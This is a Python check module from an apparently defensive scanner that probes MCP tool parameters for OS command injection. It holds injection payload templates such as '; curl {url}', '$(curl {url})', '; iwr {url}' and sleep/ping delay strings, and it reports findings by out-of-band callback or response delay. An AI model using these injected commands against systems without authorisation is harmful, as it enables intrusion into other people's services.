from mcpsnare.models import Probe, Finding, Severity, Confidence
from mcpsnare.checks.base import register

_SLEEP_SECONDS = 5
_LATENCY_MULT = 3

_POSIX, _WINDOWS = frozenset({"posix"}), frozenset({"windows"})
_BOTH = _POSIX | _WINDOWS

# OOB confirmation payloads: each triggers an outbound request to {url}. Covers POSIX
# sh, Windows cmd.exe, and PowerShell, deduped. Non-blocking (always sent). Each template
# carries the OS families whose shells can run it, so --target-os can drop the rest.
_OOB_TEMPLATES = (
    ("; curl {url}", _POSIX),          # POSIX
    ("$(curl {url})", _POSIX),         # POSIX command substitution
    ("& curl {url}", _BOTH),           # cmd.exe / POSIX background
    ("| curl {url}", _BOTH),           # cmd.exe / POSIX pipe
    ("; iwr {url}", _WINDOWS),         # PowerShell (Invoke-WebRequest)
    ("; curl.exe {url}", _WINDOWS),    # PowerShell (real curl, not the iwr alias)
)

# Blocking time-based payloads (~_SLEEP_SECONDS delay), sent only with --aggressive.
_SLEEP_TEMPLATES = (
    ("; sleep {n}", _POSIX),                  # POSIX
    ("$(sleep {n})", _POSIX),                 # POSIX command substitution
    ("& ping -n {n1} 127.0.0.1", _WINDOWS),   # cmd.exe (no sleep builtin; ping ~1s/echo)
    ("; Start-Sleep -s {n}", _WINDOWS),       # PowerShell
)


def templates_for(target_os, templates=_OOB_TEMPLATES):
    """Templates whose shell can run on ``target_os`` ("posix", "windows" or "all")."""
    return tuple(tpl for tpl, families in templates if target_os == "all" or target_os in families)

@register
class CmdInjection:
    id = "cmd_injection"
    time_based = True   # emits blocking sleep probes under --aggressive (engine skip accounting)
    def generate(self, point, ctx):
        probes = []
        target_os = getattr(ctx, "target_os", "all")
        if ctx.oob is not None:
            for tpl in templates_for(target_os, _OOB_TEMPLATES):
                token, url = ctx.oob.new_token()
                cmd = tpl.format(url=url)                  # separator+command, e.g. "; curl <url>"
                whole_args = point.set(f"mcpsnare{cmd}")
                embed_args = point.embed(cmd)             # valid-value prefix + cmd
                variants = [whole_args]
                if embed_args != whole_args:
                    variants.append(embed_args)
                for args in variants:
                    from mcpsnare.inject.jsonpath import deep_get
                    payload = deep_get(args, point.json_path)
                    probes.append(Probe(check=self.id, point=point, payload=str(payload),
                                        args=args, token=token))
        if getattr(ctx, "aggressive", False):
            for tpl in templates_for(target_os, _SLEEP_TEMPLATES):
                pl = f"mcpsnare{tpl.format(n=_SLEEP_SECONDS, n1=_SLEEP_SECONDS + 1)}"
                probes.append(Probe(check=self.id, point=point, payload=pl, args=point.set(pl),
                                    meta={"time_based": True, "threshold": _SLEEP_SECONDS}))
        return probes
    def evaluate(self, probe, response, ctx):
        if probe.token and ctx.oob and ctx.oob.interactions(probe.token):
            return self._finding(probe, Confidence.CONFIRMED,
                                 f"OOB callback received for payload {probe.payload!r}")
        if probe.meta.get("time_based"):
            elapsed = probe.meta.get("elapsed", 0)
            sleep_s = probe.meta["threshold"]
            baseline = getattr(ctx, "baseline", None)
            if baseline is not None:
                margin = max(baseline.latency + sleep_s * 0.8, baseline.latency * _LATENCY_MULT)
                evidence = f"response delayed {elapsed:.1f}s vs baseline {baseline.latency:.1f}s"
            else:
                margin = sleep_s  # no calibration: fall back to the fixed threshold
                evidence = f"response delayed {elapsed:.1f}s"
            if elapsed >= margin:
                return self._finding(probe, Confidence.FIRM, evidence)
        return None
    def _finding(self, probe, conf, evidence):
        return Finding(check=self.id, tool=probe.point.tool, param=probe.point.param_name,
                       severity=Severity.CRITICAL, confidence=conf, cwe="CWE-78",
                       title=f"Command injection in {probe.point.tool}.{probe.point.param_name}",
                       payload=probe.payload, evidence=evidence,
                       remediation="Never pass tool input to a shell; use exec with arg arrays / allowlists.")
